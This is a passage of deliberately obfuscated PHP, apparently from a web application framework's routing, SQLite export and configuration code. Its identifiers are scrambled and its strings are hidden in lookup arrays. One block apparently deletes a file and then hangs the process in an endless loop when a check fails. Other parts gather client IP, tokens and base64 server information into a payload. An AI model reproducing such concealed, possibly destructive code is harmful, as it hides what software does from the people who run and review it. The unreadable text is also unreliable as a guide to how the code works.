$ÉËöºòÔ . $£·ş§ÄÁ[73]; if ($Û›çÂÆ» && $Û›çÂÆ» == $£·ş§ÄÁ[844]) { return $ŠÈ ˜½º; } $ëï—íÄ = array_change_key_case($GLOBALS[$£·ş§ÄÁ[6]][$£·ş§ÄÁ[21]]); $åÈ±óÂõ = $ëï—íÄ[$£·ş§ÄÁ[1018]]; $›çÄïëô = $£·ş§ÄÁ[1144] . $åÈ±óÂõ . $£·ş§ÄÁ[1145] . $ºÊÙÓñë . $£·ş§ÄÁ[58]; $ë„¾²û£ = $£·ş§ÄÁ[1146] . $ºÊÙÓñë . $£·ş§ÄÁ[946]; $ôà±«¯ = $£Ì€ƒº¾->query($›çÄïëô); if (empty($ôà±«¯)) { $ÚÄ‡š¬ = array($£·ş§ÄÁ[844] => $£·ş§ÄÁ[12], $£·ş§ÄÁ[13] => $£·ş§ÄÁ[12]); return $Û›çÂÆ» ? $ÚÄ‡š¬[$Û›çÂÆ»] : $ÚÄ‡š¬; } $¸Ê¤€Í† = $£Ì€ƒº¾->query($ë„¾²û£); $¶„Äë¨ = $£·ş§ÄÁ[12]; $”óš¬£§ = array(); foreach ($¸Ê¤€Í† as $òı«ÙŞÄ) { if (!$¶„Äë¨ && $òı«ÙŞÄ[$£·ş§ÄÁ[1147]] == $£·ş§ÄÁ[1148]) { $¶„Äë¨ = $òı«ÙŞÄ[$£·ş§ÄÁ[1149]]; } if (isset($”óš¬£§[$òı«ÙŞÄ[$£·ş§ÄÁ[1147]]])) { $”óš¬£§[$òı«ÙŞÄ[$£·ş§ÄÁ[1147]]][$£·ş§ÄÁ[1150]][] = $òı«ÙŞÄ[$£·ş§ÄÁ[1149]]; continue; } $”óš¬£§[$òı«ÙŞÄ[$£·ş§ÄÁ[1147]]] = array($£·ş§ÄÁ[1151] => $òı«ÙŞÄ[$£·ş§ÄÁ[1147]], $£·ş§ÄÁ[1150] => array($òı«ÙŞÄ[$£·ş§ÄÁ[1149]]), $£·ş§ÄÁ[1152] => $òı«ÙŞÄ[$£·ş§ÄÁ[1153]] == $£·ş§ÄÁ[90] ? 0 : 1); } $­ÍœØãš = array(); foreach ($”óš¬£§ as $òı«ÙŞÄ) { $¨ÅËÉĞé = $òı«ÙŞÄ[$£·ş§ÄÁ[1151]] == $£·ş§ÄÁ[1148]; $üõó¯À = array($£·ş§ÄÁ[1154], $òı«ÙŞÄ[$£·ş§ÄÁ[1152]] == $£·ş§ÄÁ[90] && !$¨ÅËÉĞé ? $£·ş§ÄÁ[1155] : $£·ş§ÄÁ[12], $£·ş§ÄÁ[1156], $£·ş§ÄÁ[1157] . $ºÊÙÓñë . $£·ş§ÄÁ[11] . ($¨ÅËÉĞé ? $£·ş§ÄÁ[1158] : $òı«ÙŞÄ[$£·ş§ÄÁ[1151]]) . $£·ş§ÄÁ[120], $£·ş§ÄÁ[1159], $£·ş§ÄÁ[120] . $ºÊÙÓñë . $£·ş§ÄÁ[120], $£·ş§ÄÁ[1160] . implode($£·ş§ÄÁ[1161], $òı«ÙŞÄ[$£·ş§ÄÁ[1150]]) . $£·ş§ÄÁ[1162]); $­ÍœØãš[] = implode($£·ş§ÄÁ[53], $üõó¯À) . $£·ş§ÄÁ[73]; } $Û€ƒœ = array(); $£Ô»ê´Š = array($£·ş§ÄÁ[1163] => $£·ş§ÄÁ[1164], $£·ş§ÄÁ[1164] => $£·ş§ÄÁ[1164], $£·ş§ÄÁ[334] => $£·ş§ÄÁ[361], $£·ş§ÄÁ[333] => $£·ş§ÄÁ[361]); foreach ($ôà±«¯ as $òı«ÙŞÄ) { $üõó¯À = array($£·ş§ÄÁ[120] . $òı«ÙŞÄ[$£·ş§ÄÁ[1165]] . $£·ş§ÄÁ[120], isset($£Ô»ê´Š[$òı«ÙŞÄ[$£·ş§ÄÁ[1166]]]) ? $£Ô»ê´Š[$òı«ÙŞÄ[$£·ş§ÄÁ[1166]]] : $òı«ÙŞÄ[$£·ş§ÄÁ[1167]], $òı«ÙŞÄ[$£·ş§ÄÁ[1168]] == $£·ş§ÄÁ[944] ? $£·ş§ÄÁ[1169] : $£·ş§ÄÁ[1170], $òı«ÙŞÄ[$£·ş§ÄÁ[1165]] == $¶„Äë¨ ? $£·ş§ÄÁ[1171] : $£·ş§ÄÁ[12], $òı«ÙŞÄ[$£·ş§ÄÁ[995]] ? strtoupper(str_replace($£·ş§ÄÁ[11], $£·ş§ÄÁ[12], $òı«ÙŞÄ[$£·ş§ÄÁ[995]])) : $£·ş§ÄÁ[12]); $Û€ƒœ[] = trim(implode($£·ş§ÄÁ[53], $üõó¯À)); } $±ƒ‡ö”ù = array($£·ş§ÄÁ[1172] . $ºÊÙÓñë . $£·ş§ÄÁ[1173], $£·ş§ÄÁ[1174] . $ºÊÙÓñë . $£·ş§ÄÁ[1175], implode($£·ş§ÄÁ[50] . PHP_EOL, $Û€ƒœ), $£·ş§ÄÁ[992]); $é²®Õè = implode(PHP_EOL, array_merge($±ƒ‡ö”ù, $­ÍœØãš)); if ($Û›çÂÆ» && $Û›çÂÆ» == $£·ş§ÄÁ[13]) { return $é²®Õè; } $ÚÄ‡š¬ = array($£·ş§ÄÁ[844] => $ŠÈ ˜½º, $£·ş§ÄÁ[13] => $é²®Õè); return $Û›çÂÆ» ? $ÚÄ‡š¬[$Û›çÂÆ»] : $ÚÄ‡š¬; } public function sqlFromSqlite($ã‡·ÒÙÎ, $´ÅÆ—‚¤ = '') { $¨ÅŸ¤ÊÁ =& $_SERVER[èùÙ¹Ïö]; $ó¶ÊÆ†½ = $this->model()->db(); $Êú™€Í = "\x50\122\x41\x47\115\x41\40\x54\x41\x42\114\105\137\x49\116\x46\x4f\x20\x28\47{$ã‡·ÒÙÎ}\47\x29"; $ˆµÀÙÊû = "\123\x45\x4c\x45\103\124\40\52\40\x46\122\117\115\x20\x73\x71\x6c\x69\164\145\137\155\x61\x73\x74\x65\162\40\127\110\x45\122\105\40\x74\x62\154\x5f\x6e\x61\x6d\x65\40\x3d\x20\47{$ã‡·ÒÙÎ}\x27"; $£›¹ËÏ = $ó¶ÊÆ†½->query($Êú™€Í); if (empty($£›¹ËÏ)) { $¿§·ÊÉÆ = array($¨ÅŸ¤ÊÁ[844] => $¨ÅŸ¤ÊÁ[12], $¨ÅŸ¤ÊÁ[13] => $¨ÅŸ¤ÊÁ[12]); return $´ÅÆ—‚¤ ? $¿§·ÊÉÆ[$´ÅÆ—‚¤] : $¿§·ÊÉÆ; } $ ‹Şş¢£ = $ó¶ÊÆ†½->query($ˆµÀÙÊû); $ ²ÇŸÌ = $äşÎ¹ÂŠ = array(); foreach ($ ‹Şş¢£ as $‰µÏ”“±) { if ($‰µÏ”“±[$¨ÅŸ¤ÊÁ[33]] == $¨ÅŸ¤ÊÁ[325]) { $ ²ÇŸÌ[] = $‰µÏ”“±[$¨ÅŸ¤ÊÁ[1176]]; } else { $äşÎ¹ÂŠ[$‰µÏ”“±[$¨ÅŸ¤ÊÁ[32]]] = $‰µÏ”“±[$¨ÅŸ¤ÊÁ[1176]]; } } $°ïğÓÍú = array_merge(array($¨ÅŸ¤ÊÁ[1172] . $ã‡·ÒÙÎ . $¨ÅŸ¤ÊÁ[120]), $ ²ÇŸÌ, array_values($äşÎ¹ÂŠ)); $°ïğÓÍú = implode($¨ÅŸ¤ÊÁ[73] . PHP_EOL, $°ïğÓÍú) . $¨ÅŸ¤ÊÁ[73]; if ($´ÅÆ—‚¤ && $´ÅÆ—‚¤ == $¨ÅŸ¤ÊÁ[13]) { return $°ïğÓÍú; } $¸ìÒÓœè = array(); $‚şÛóØÛ = array($¨ÅŸ¤ÊÁ[1164] => $¨ÅŸ¤ÊÁ[1177], $¨ÅŸ¤ÊÁ[361] => $¨ÅŸ¤ÊÁ[1178]); $ÅõÀÓù = $¨ÅŸ¤ÊÁ[12]; foreach ($£›¹ËÏ as $‰µÏ”“±) { if ($‰µÏ”“±[$¨ÅŸ¤ÊÁ[57]] == $¨ÅŸ¤ÊÁ[90]) { $ÅõÀÓù = $‰µÏ”“±[$¨ÅŸ¤ÊÁ[32]]; } $©ÉâıÉû = array($¨ÅŸ¤ÊÁ[431] . $‰µÏ”“±[$¨ÅŸ¤ÊÁ[32]] . $¨ÅŸ¤ÊÁ[431], isset($‚şÛóØÛ[$‰µÏ”“±[$¨ÅŸ¤ÊÁ[33]]]) ? $‚şÛóØÛ[$‰µÏ”“±[$¨ÅŸ¤ÊÁ[33]]] : $‰µÏ”“±[$¨ÅŸ¤ÊÁ[33]], $‰µÏ”“±[$¨ÅŸ¤ÊÁ[35]] == $¨ÅŸ¤ÊÁ[90] ? $¨ÅŸ¤ÊÁ[1169] : $¨ÅŸ¤ÊÁ[1179] . $‰µÏ”“±[$¨ÅŸ¤ÊÁ[56]], $‰µÏ”“±[$¨ÅŸ¤ÊÁ[57]] == $¨ÅŸ¤ÊÁ[90] ? $¨ÅŸ¤ÊÁ[1180] : $¨ÅŸ¤ÊÁ[12]); $¸ìÒÓœè[] = trim(implode($¨ÅŸ¤ÊÁ[53], $©ÉâıÉû)); } foreach ($äşÎ¹ÂŠ as $ÇÑÎäò» => $”ÇşˆĞ„) { $ı–ßáå = str_replace($¨ÅŸ¤ÊÁ[1181] . $ã‡·ÒÙÎ . $¨ÅŸ¤ÊÁ[11], $¨ÅŸ¤ÊÁ[12], $ÇÑÎäò»); $ÕÜÑ÷üÑ = str_replace(array($¨ÅŸ¤ÊÁ[120], $¨ÅŸ¤ÊÁ[1003]), $¨ÅŸ¤ÊÁ[431], substr($”ÇşˆĞ„, stripos($”ÇşˆĞ„, $¨ÅŸ¤ÊÁ[306]))); if ($ı–ßáå == $¨ÅŸ¤ÊÁ[1158]) { $–İÃ»íŠ = $¨ÅŸ¤ÊÁ[1182] . $ÅõÀÓù . $¨ÅŸ¤ÊÁ[1183]; } else { $–İÃ»íŠ = (stripos($ı–ßáå, $¨ÅŸ¤ÊÁ[11]) ? $¨ÅŸ¤ÊÁ[1184] : $¨ÅŸ¤ÊÁ[12]) . ($¨ÅŸ¤ÊÁ[1185] . $ı–ßáå . $¨ÅŸ¤ÊÁ[1186] . $ÕÜÑ÷üÑ); } $¸ìÒÓœè[] = $–İÃ»íŠ; } $ÄâãŞ˜‹ = array($¨ÅŸ¤ÊÁ[1187] . $ã‡·ÒÙÎ . $¨ÅŸ¤ÊÁ[1188], $¨ÅŸ¤ÊÁ[1189] . $ã‡·ÒÙÎ . $¨ÅŸ¤ÊÁ[1190], implode($¨ÅŸ¤ÊÁ[50] . PHP_EOL, $¸ìÒÓœè), $¨ÅŸ¤ÊÁ[1191]); $Œ÷°¦˜¥ = implode(PHP_EOL, $ÄâãŞ˜‹); if ($´ÅÆ—‚¤ && $´ÅÆ—‚¤ == $¨ÅŸ¤ÊÁ[844]) { return $Œ÷°¦˜¥; } $¿§·ÊÉÆ = array($¨ÅŸ¤ÊÁ[844] => $Œ÷°¦˜¥, $¨ÅŸ¤ÊÁ[13] => $°ïğÓÍú); return $´ÅÆ—‚¤ ? $¿§·ÊÉÆ[$´ÅÆ—‚¤] : $¿§·ÊÉÆ; } } if (!isset($_SERVER[$_SERVER[èùÙ¹Ïö][920]]) || !isset($_SERVER[$_SERVER[èùÙ¹Ïö][1192]])) { $_getc = $_SERVER[èùÙ¹Ïö][922]; $_getfile = $_SERVER[$_SERVER[èùÙ¹Ïö][917]] . $_SERVER[èùÙ¹Ïö][918]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[èùÙ¹Ïö][248], $_getfilec); if (count($_getarrs) < $_SERVER[èùÙ¹Ïö][663]) { $exit = $_SERVER[èùÙ¹Ïö][923]; $exit(); } $_act = $_SERVER[èùÙ¹Ïö][1193]; $_act($_SERVER[$_SERVER[èùÙ¹Ïö][917]] . $_SERVER[èùÙ¹Ïö][918]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[èùÙ¹Ïö][424]); } } goto aŠ¼‚ù¦Äì; f´Ğ²©„•Î: class Application { private $defaultModule = "\x69\x6e\x64\x65\x78"; private $defaultController = "\x69\156\144\145\170"; private $defaultAction = "\x69\156\144\145\x78"; function __construct() { } public function setDefault($Èß¸¨’Æ) { $ğºŒë½« =& $_SERVER[èùÙ¹Ïö]; $ß¿Ì…  =& $_SERVER[€ÇÉªãÇ]; $Â‰ß˜ò = explode($ß¿Ì… [0], trim($Èß¸¨’Æ, $ß¿Ì… [0])); $¥õ³Åß° = $ğºŒë½«[656]; if (strlen($¥õ³Åß°) < $ğºŒë½«[655]) { die; } $this->defaultModule = $Â‰ß˜ò[0] ? $Â‰ß˜ò[0] : $this->defaultModule; $Àßá©ôš = $ğºŒë½«[657]; while ($Àßá©ôš < $ğºŒë½«[658]) { if ($Àßá©ôš >= 0) { break; } $Àßá©ôš++; } $this->defaultController = $Â‰ß˜ò[1] ? $Â‰ß˜ò[1] : $this->defaultController; $•ª”àİ« = $ğºŒë½«[659]; $this->defaultAction = $Â‰ß˜ò[2] ? $Â‰ß˜ò[2] : $this->defaultAction; $çøªŸª = $ğºŒë½«[660]; if (!$çøªŸª) { die; } $this->zhecbf1079e9($ß¿Ì… [1], array($this, $ß¿Ì… [2])); $×ƒĞ“íƒ = $ğºŒë½«[661]; while ($×ƒĞ“íƒ < $ğºŒë½«[655]) { if ($×ƒĞ“íƒ >= 0) { break; } $×ƒĞ“íƒ++; } } public function appRun($™ö¸²áÈ) { $›ê¨Ê‘— =& $_SERVER[èùÙ¹Ïö]; $Š¯Âè²ç =& $_SERVER[€ÇÉªãÇ]; $‚ıàô¼² = explode($Š¯Âè²ç[0], $™ö¸²áÈ); $¼÷Ş­ŒÊ = $›ê¨Ê‘—[662]; if (strlen($¼÷Ş­ŒÊ) < $›ê¨Ê‘—[663]) { return; } $¹ºë†Îƒ = strtolower($‚ıàô¼²[0]); $€ÈâÀ©È = $Š¯Âè²ç[3]; if ($¹ºë†Îƒ == $Š¯Âè²ç[4]) { $€ÈâÀ©È = $Š¯Âè²ç[5]; $‚ıàô¼²[0] = $Š¯Âè²ç[6]; $‚ıàô¼²[1] = $‚ıàô¼²[1] . $Š¯Âè²ç[7]; $™ö¸²áÈ = join($Š¯Âè²ç[0], $‚ıàô¼²); $™ö¸²áÈ = trim($™ö¸²áÈ, $Š¯Âè²ç[0]); } call_user_func(array($Š¯Âè²ç[8], $Š¯Âè²ç[9]), $€ÈâÀ©È . $Š¯Âè²ç[10], $™ö¸²áÈ); ActionCall($™ö¸²áÈ); call_user_func(array($Š¯Âè²ç[8], $Š¯Âè²ç[9]), $€ÈâÀ©È . $Š¯Âè²ç[11], $™ö¸²áÈ); } private function autorun() { $É¥¸ÃÆĞ =& $_SERVER[€ÇÉªãÇ]; global $config; if (count($config[$É¥¸ÃÆĞ[12]]) == 0) { return; } foreach ($config[$É¥¸ÃÆĞ[12]] as $ƒšõöºÖ => $ıÏ‚Ş¹ñ) { $this->appRun($ıÏ‚Ş¹ñ); $ìğ¯ñ¢Ù = $_SERVER[èùÙ¹Ïö][664]; } } private function twlo72b407a5() { $’°ä¨ =& $_SERVER[èùÙ¹Ïö]; $ö–àïá„ =& $_SERVER[€ÇÉªãÇ]; $ê¾Íû¤… = $ö–àïá„[4]; $í£§°¾Í = $GLOBALS[$ö–àïá„[13]][$ö–àïá„[14]][0]; $Û¥Ğ¢êà = $’°ä¨[665]; if (!$Û¥Ğ¢êà) { return; } if (!$í£§°¾Í || strlen($í£§°¾Í) <= strlen($ê¾Íû¤…)) { return; } if (strtolower(substr($í£§°¾Í, -strlen($ê¾Íû¤…))) != $ê¾Íû¤…) { return; } $›ë—Ş = substr($í£§°¾Í, 0, -strlen($ê¾Íû¤…)); $ş™î¾²ş = array($ö–àïá„[4], $›ë—Ş); $»î¬ÉË¹ = $’°ä¨[666]; if (!$»î¬ÉË¹) { die; } $ÄùŸï¸º = array_slice($GLOBALS[$ö–àïá„[13]][$ö–àïá„[14]], 1); $GLOBALS[$ö–àïá„[13]][$ö–àïá„[14]] = array_merge($ş™î¾²ş, $ÄùŸï¸º); $GLOBALS[$ö–àïá„[13]][$ö–àïá„[15]] = implode($ö–àïá„[0], $GLOBALS[$ö–àïá„[13]][$ö–àïá„[14]]); $²º–Ïüô = $’°ä¨[667]; if (!$²º–Ïüô) { die; } } private function lvwcc3887aa8() { $üøÎû¢ =& $_SERVER[èùÙ¹Ïö]; $Ú¤‘º®İ =& $_SERVER[€ÇÉªãÇ]; if ($GLOBALS[$Ú¤‘º®İ[13]][$Ú¤‘º®İ[15]] != $Ú¤‘º®İ[6]) { return; } $­ªÈ·«Ù = $_SERVER[$Ú¤‘º®İ[16]]; $Ñ™Ğ»£û = $Ú¤‘º®İ[17]; if (!strstr($­ªÈ·«Ù, $Ñ™Ğ»£û)) { return; } $¹·ß‡¹ = strrpos($­ªÈ·«Ù, $Ñ™Ğ»£û); $­Ş•Ó”Ï = substr($­ªÈ·«Ù, $¹·ß‡¹ + strlen($Ñ™Ğ»£û)); $Ä¤…ƒìª = $üøÎû¢[668]; if (strlen($Ä¤…ƒìª) < $üøÎû¢[651]) { die; } preg_match_all($Ú¤‘º®İ[18], $­Ş•Ó”Ï, $÷©¸½›’); $ŒÈ›ñËÆ = $üøÎû¢[669]; while (strlen($ŒÈ›ñËÆ) < $üøÎû¢[655]) { if (!$ŒÈ›ñËÆ) { break; } $ŒÈ›ñËÆ++; } $­Ş•Ó”Ï = trim($÷©¸½›’[0][0], $Ú¤‘º®İ[19]); $GLOBALS[$Ú¤‘º®İ[13]][$Ú¤‘º®İ[14]] = explode($Ú¤‘º®İ[19], $­Ş•Ó”Ï); $GLOBALS[$Ú¤‘º®İ[13]][$Ú¤‘º®İ[15]] = implode($Ú¤‘º®İ[0], $GLOBALS[$Ú¤‘º®İ[13]][$Ú¤‘º®İ[14]]); $ä®ÖÊ¬ = $üøÎû¢[670]; if (!$ä®ÖÊ¬) { die; } } public function run() { $¶…ì´Ò× =& $_SERVER[èùÙ¹Ïö]; $¤‡ó³×š =& $_SERVER[€ÇÉªãÇ]; $this->lvwcc3887aa8(); $this->twlo72b407a5(); $°ƒíŠ°¦ = $¶…ì´Ò×[671]; while (strlen($°ƒíŠ°¦) < $¶…ì´Ò×[672]) { if (!$°ƒíŠ°¦) { break; } $°ƒíŠ°¦++; } $ƒØ˜›ãï = $GLOBALS[$¤‡ó³×š[13]][$¤‡ó³×š[14]]; $‚ñª¦ª½ = $GLOBALS[$¤‡ó³×š[13]][$¤‡ó³×š[15]]; define($¤‡ó³×š[20], isset($ƒØ˜›ãï[0]) && $ƒØ˜›ãï[0] ? $ƒØ˜›ãï[0] : $this->defaultModule); $»ë§Ãô = $¶…ì´Ò×[673]; while ($»ë§Ãô < $¶…ì´Ò×[658]) { if ($»ë§Ãô >= 0) { break; } $»ë§Ãô++; } define($¤‡ó³×š[21], isset($ƒØ˜›ãï[1]) && $ƒØ˜›ãï[0] ? $ƒØ˜›ãï[1] : $this->defaultController); $û™ö„¾í = $¶…ì´Ò×[674]; define($¤‡ó³×š[22], isset($ƒØ˜›ãï[2]) && $ƒØ˜›ãï[0] ? $ƒØ˜›ãï[2] : $this->defaultAction); define($¤‡ó³×š[23], MOD . $¤‡ó³×š[0] . ST . $¤‡ó³×š[0] . ACT); $¤¸öí¿ = $¶…ì´Ò×[675]; if (!$¤¸öí¿) { die; } $_SERVER[$¤‡ó³×š[24]] = strtolower(ACTION); $this->autorun(); $¿ªÓç¹ = $¶…ì´Ò×[676]; if (count($ƒØ˜›ãï) >= 3) { $this->appRun($‚ñª¦ª½); } else { $this->appRun(ACTION); } } private $cgef3782c5d6 = array(); private $ajged99aa019 = ''; public function xios4d56ccd6() { $äĞÑÔªú =& $_SERVER[èùÙ¹Ïö]; $Ø¤ß­àÜ =& $_SERVER[€ÇÉªãÇ]; $this->kxcr35c6dc34(); $ÛÍ‰îÏÈ = $äĞÑÔªú[677]; if (strlen($ÛÍ‰îÏÈ) < $äĞÑÔªú[663]) { die; } $this->nbfr7c6b2fcc(); $this->ljsv8674d196(); $å˜„ÉÙ° = $äĞÑÔªú[678]; $this->oaym1a35acbc(); $¹üñˆ³ä = $äĞÑÔªú[679]; if (!$¹üñˆ³ä) { die; } $this->rdincfcda5cc(); $this->hfos6ae3a4a2(); $–şÃ¢å“ = $äĞÑÔªú[680]; $this->tarobcb45448(); $à½—ÆÖë = $äĞÑÔªú[681]; $this->zhecbf1079e9($Ø¤ß­àÜ[25], array($this, $Ø¤ß­àÜ[26])); $this->zhecbf1079e9($Ø¤ß­àÜ[27], array($this, $Ø¤ß­àÜ[28])); $‘‚¾É› = $äĞÑÔªú[682]; if (!$‘‚¾É›) { die; } $this->zhecbf1079e9($Ø¤ß­àÜ[29], array($this, $Ø¤ß­àÜ[30])); $this->zhecbf1079e9($Ø¤ß­àÜ[31], array($this, $Ø¤ß­àÜ[32])); $®ñ§†¹ê = $äĞÑÔªú[683]; while (strlen($®ñ§†¹ê) < $äĞÑÔªú[672]) { if (!$®ñ§†¹ê) { break; } $®ñ§†¹ê++; } } public function vqik1aaac0ef($œ¦Î·Íí) { $×›¬ˆ£¸ =& $_SERVER[èùÙ¹Ïö]; $ÉóÁ«†„ =& $_SERVER[€ÇÉªãÇ]; $á¾…Ô·ï = Model($ÉóÁ«†„[33])->get(); $Ë½×„õû = array($ÉóÁ«†„[34], $ÉóÁ«†„[35], $ÉóÁ«†„[36], $ÉóÁ«†„[37], $ÉóÁ«†„[38], $ÉóÁ«†„[39], $ÉóÁ«†„[40], $ÉóÁ«†„[41], $ÉóÁ«†„[42], $ÉóÁ«†„[43], $ÉóÁ«†„[44], $ÉóÁ«†„[45], $ÉóÁ«†„[46], $ÉóÁ«†„[47], $ÉóÁ«†„[48], $ÉóÁ«†„[49], $ÉóÁ«†„[50], $ÉóÁ«†„[51], $ÉóÁ«†„[52], $ÉóÁ«†„[53], $ÉóÁ«†„[54], $ÉóÁ«†„[55], $ÉóÁ«†„[56], $ÉóÁ«†„[57], $ÉóÁ«†„[58], $ÉóÁ«†„[59], $ÉóÁ«†„[60], $ÉóÁ«†„[61], $ÉóÁ«†„[62], $ÉóÁ«†„[63], $ÉóÁ«†„[64], $ÉóÁ«†„[65], $ÉóÁ«†„[66], $ÉóÁ«†„[67], $ÉóÁ«†„[68], $ÉóÁ«†„[69], $ÉóÁ«†„[70], $ÉóÁ«†„[71], $ÉóÁ«†„[72], $ÉóÁ«†„[73], $ÉóÁ«†„[74], $ÉóÁ«†„[75], $ÉóÁ«†„[76], $ÉóÁ«†„[77], $ÉóÁ«†„[78], $ÉóÁ«†„[79], $ÉóÁ«†„[80], $ÉóÁ«†„[81], $ÉóÁ«†„[82], $ÉóÁ«†„[83], $ÉóÁ«†„[84]); $çÛõßÒŞ = $×›¬ˆ£¸[684]; foreach ($Ë½×„õû as $Ôïêµú‰) { $ÂŠëÑĞû = $GLOBALS[$ÉóÁ«†„[85]][$ÉóÁ«†„[86]][$Ôïêµú‰]; $›’£üäç = $×›¬ˆ£¸[685]; while (strlen($›’£üäç) < $×›¬ˆ£¸[663]) { if (!$›’£üäç) { break; } $›’£üäç++; } if (isset($á¾…Ô·ï[$Ôïêµú‰])) { $ÂŠëÑĞû = $á¾…Ô·ï[$Ôïêµú‰]; } $œ¦Î·Íí[$ÉóÁ«†„[87]][$ÉóÁ«†„[88]][$Ôïêµú‰] = $ÂŠëÑĞû; } $¶ÉÕó‹› = $œ¦Î·Íí[$ÉóÁ«†„[87]][$ÉóÁ«†„[88]][$ÉóÁ«†„[46]]; unset($œ¦Î·Íí[$ÉóÁ«†„[87]][$ÉóÁ«†„[89]][$ÉóÁ«†„[90]]); $’ÌÌ¸Û× = $×›¬ˆ£¸[686]; if (strlen($’ÌÌ¸Û×) < $×›¬ˆ£¸[651]) { die; } unset($œ¦Î·Íí[$ÉóÁ«†„[87]][$ÉóÁ«†„[89]][$ÉóÁ«†„[91]]); $Üã§Õâê = $×›¬ˆ£¸[687]; if (!$Üã§Õâê) { return; } unset($œ¦Î·Íí[$ÉóÁ«†„[87]][$ÉóÁ«†„[88]][$ÉóÁ«†„[46]]); $ÀÖã–½ğ = $×›¬ˆ£¸[688]; if (strlen($ÀÖã–½ğ) < $×›¬ˆ£¸[663]) { die; } unset($œ¦Î·Íí[$ÉóÁ«†„[87]][$ÉóÁ«†„[88]][$ÉóÁ«†„[92]]); $‰úÆŠÚÔ = $×›¬ˆ£¸[689]; while ($‰úÆŠÚÔ < $×›¬ˆ£¸[663]) { if ($‰úÆŠÚÔ >= 0) { break; } $‰úÆŠÚÔ++; } $œ¦Î·Íí[$ÉóÁ«†„[87]][$ÉóÁ«†„[88]][$ÉóÁ«†„[93]] = array($ÉóÁ«†„[94] => (int) $¶ÉÕó‹›[$ÉóÁ«†„[95]], $ÉóÁ«†„[96] => (int) _get($¶ÉÕó‹›, $ÉóÁ«†„[97], 0)); $ºˆ¿” = $×›¬ˆ£¸[690]; while ($ºˆ¿” < $×›¬ˆ£¸[658]) { if ($ºˆ¿” >= 0) { break; } $ºˆ¿”++; } $¬ºÓ÷ş¿ = substr(md5($ÉóÁ«†„[98] . get_client_ip() . $á¾…Ô·ï[$ÉóÁ«†„[99]]), 0, 15); $œ¦Î·Íí[$ÉóÁ«†„[100]][$ÉóÁ«†„[101]] = Mcrypt::encode(Session::sign(), $¬ºÓ÷ş¿, 3600 * 24); $ÓĞ‰Á©‰ = $×›¬ˆ£¸[691]; if (!$ÓĞ‰Á©‰) { return; } $œ¦Î·Íí[$ÉóÁ«†„[100]][$ÉóÁ«†„[102]] = Action($ÉóÁ«†„[103])->accessToken(); $œ¦Î·Íí[$ÉóÁ«†„[100]][$ÉóÁ«†„[104]] = md5($_SERVER[$ÉóÁ«†„[105]] . $á¾…Ô·ï[$ÉóÁ«†„[99]]); $œ¦Î·Íí[$ÉóÁ«†„[100]][$ÉóÁ«†„[106]] = base64_encode(serverInfo()); $€›…´§Ê = $×›¬ˆ£¸[692]; while (strlen($€›…´§Ê) < $×›¬ˆ£¸[658]) { if (!$€›…´§Ê) { break; } $€›…´§Ê++; } $œ¦Î·Íí[$ÉóÁ«†„[100]][$ÉóÁ«†„[107]] = $this->ajged99aa019; $Ş»Œ¿– = $×›¬ˆ£¸[693]; if (!$Ş»Œ¿–) { die; } if ($á¾…Ô·ï[$ÉóÁ«†„[107]] != $ÉóÁ«†„[108]) { $œ¦Î·Íí[$ÉóÁ«†„[100]][$ÉóÁ«†„[109]] = $á¾…Ô·ï[$ÉóÁ«†„[109]]; $œ¦Î·Íí[$ÉóÁ«†„[100]][$ÉóÁ«†„[110]] = $á¾…Ô·ï[$ÉóÁ«†„[110]]; $ªáõêŒ‘ = rand_string(10) . $this->ajged99aa019 . rand_string(5); $œ¦Î·Íí[$ÉóÁ«†„[87]][$ÉóÁ«†„[111]][$ÉóÁ«†„[112]] = $this->doni1913d9ea($ªáõêŒ‘, $œ¦Î·Íí[$ÉóÁ«†„[100]][$ÉóÁ«†„[104]]); } if ($this->ajged99aa019 == $ÉóÁ«†„[108]) { $œ¦Î·Íí[$ÉóÁ«†„[87]][$ÉóÁ«†„[88]][$ÉóÁ«†„[93]][$ÉóÁ«†„[97]] = 0; } $œ¦Î·Íí[$ÉóÁ«†„[100]][$ÉóÁ«†„[113]] = _get($this->cgef3782c5d6, $ÉóÁ«†„[114], $ÉóÁ«†„[6]); $œ¦Î·Íí[$ÉóÁ«†„[100]][$ÉóÁ«†„[115]] = _get($this->cgef3782c5d6, $ÉóÁ«†„[116], $ÉóÁ«†„[6]); $¹½ßæ§† = $×›¬ˆ£¸[694]; if (!$¹½ßæ§†) { die; } if (_get($GLOBALS, $ÉóÁ«†„[117]) && $this->config[$ÉóÁ«†„[118]]) { $œ¦Î·Íí[$ÉóÁ«†„[100]][$ÉóÁ«†„[119]] = WEB_ROOT; } return $œ¦Î·Íí; } private function hfos6ae3a4a2() { $ú™ŞÖ¹û =& $_SERVER[èùÙ¹Ïö]; $‹Óôˆ =& $_SERVER[€ÇÉªãÇ]; $ä¤À°Í = $_SERVER[$‹Óôˆ[24]] == $‹Óôˆ[120]; if ($_SERVER[$‹Óôˆ[24]] == $‹Óôˆ[121] && $_GET[$‹Óôˆ[122]] == $‹Óôˆ[123]) { $ä¤À°Í = !0; } if ($ä¤À°Í) { $®ÃŸ»÷ = array($‹Óôˆ[107] => $this->ajged99aa019, $‹Óôˆ[124] => $this->zsjnb376f5b8(), $‹Óôˆ[125] => Model($‹Óôˆ[126])->count()); if ($this->ajged99aa019 != $‹Óôˆ[108]) { $Ÿ¼ŠÔƒ½ = _get($this->cgef3782c5d6, $‹Óôˆ[127]); if ($Ÿ¼ŠÔƒ½) { $®ÃŸ»÷[$‹Óôˆ[128]] = $Ÿ¼ŠÔƒ½; $®ÃŸ»÷[$‹Óôˆ[129]] = strtotime(_get($this->cgef3782c5d6, $‹Óôˆ[130])); $®ÃŸ»÷[$‹Óôˆ[131]] = _get($this->cgef3782c5d6, $‹Óôˆ[116]); } $ù†öĞª¡ = Model($‹Óôˆ[33])->get($‹Óôˆ[132], $‹Óôˆ[6], !0); if (is_string($ù†öĞª¡) && substr($ù†öĞª¡, 0, 1) == $‹Óôˆ[133]) { $ù†öĞª¡ = json_decode_force($ù†öĞª¡); } if (is_array($ù†öĞª¡) && $ù†öĞª¡[$‹Óôˆ[134]] && strstr($ù†öĞª¡[$‹Óôˆ[134]], $‹Óôˆ[135])) { $ë„ı˜Ä = explode($‹Óôˆ[135], $ù†öĞª¡[$‹Óôˆ[134]]); $®ÃŸ»÷[$‹Óôˆ[136]] = $ë„ı˜Ä[0]; } } $®ÃŸ»÷ = $this->wgti38a56078(json_encode($®ÃŸ»÷), 